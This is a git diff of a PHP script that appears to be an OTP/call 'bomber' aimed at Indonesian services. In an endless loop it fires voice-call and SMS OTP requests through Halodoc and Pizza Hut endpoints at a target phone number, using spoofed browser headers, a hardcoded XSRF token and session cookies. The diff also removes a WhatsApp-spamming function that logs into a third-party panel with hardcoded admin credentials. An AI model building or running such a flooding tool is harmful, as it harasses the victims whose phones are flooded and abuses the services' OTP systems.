@@ -33,22 +33,6 @@ function Curl($url, $header=0, $post=0, $proxy=0){
 		return array($head,$body);
 	}
 }
-function PesanWatsap($nomor,$pesan){
-	$h[] = "demomd.bermainapi.com";
-	$h[] = "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36";
-	
-	$data = ["username"=>"admin","password"=>"123456"];
-	curl('https://demomd.bermainapi.com/login.php',$h,http_build_query($data));
-	
-	$data = ["nomor"=>$nomor,"pesan"=>$pesan];
-	$r = curl('https://demomd.bermainapi.com/kirimmanual.php',$h,http_build_query($data))[1];
-	$title = explode("',",explode("title: '",$r)[1])[0];
-	if($title == "Success!"){
-		print h."Success ".p."-> ".c."Type: ".k."Whatsapp".n;
-	}else{
-		print m."Error! ".p."-> ".c."Type: ".k."Whatsapp".n;
-	}
-}
 function TelponBiasa($nomor){
 	$h = ["Host:www.halodoc.com", "content-length:51",'sec-ch-ua:" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',"accept:application/json, text/plain, */*","x-xsrf-token:698579A24EA56C0FFFAF8EC4CB3878FC75AC8552A1FA78B5DD6EBEE764EEA532276579B9A869E52C5F051810B33452483920","sec-ch-ua-mobile:?1","user-agent:Mozilla/5.0 (Linux; Android 10; SM-M022F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",'sec-ch-ua-platform:"Android"',"content-type:application/json","origin:https://www.halodoc.com","sec-fetch-site:same-origin","sec-fetch-mode:cors","sec-fetch-dest:empty","accept-encoding:gzip, deflate, br","accept-language:id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie:_ga=GA1.2.1543313695.1646049978","cookie:afUserId=5f8d958a-0b5d-4273-8f4f-5faa0fd14acd-o","cookie:XSRF-TOKEN=698579A24EA56C0FFFAF8EC4CB3878FC75AC8552A1FA78B5DD6EBEE764EEA532276579B9A869E52C5F051810B33452483920","cookie:_gcl_au=1.1.1312632912.1655318369","cookie:_gid=GA1.2.613342797.1655318370","cookie:ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22bd08a369-2fcd-c770-b3fa-c4427a0cdbcc%22%2C%22c%22%3A1646049979917%2C%22l%22%3A1655318370099%7D","cookie:AF_SYNC=1655318375040","cookie:amp_394863=mP4ApHXmzlyfxF2n4uxpVC...1g5kajne8.1g5kaoi8h.6.0.6","cookie:ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22d44ab253-585f-fda5-0a33-0b0c472dcc2a%22%2C%22e%22%3A1655320330338%2C%22c%22%3A1655318370090%2C%22l%22%3A1655318530338%7D"];
 	$data = json_encode(["phone_number"=>"+".$nomor,"channel" => "voice"]);
@@ -135,5 +119,4 @@ while(true){
 	//OtpOlx($nomor); //Sms
 	TelponBiasa($nomor); //Telfon
 	OtpPizzahut($nomor);
-	PesanWatsap($nomor,$pesan); //Wa
 }
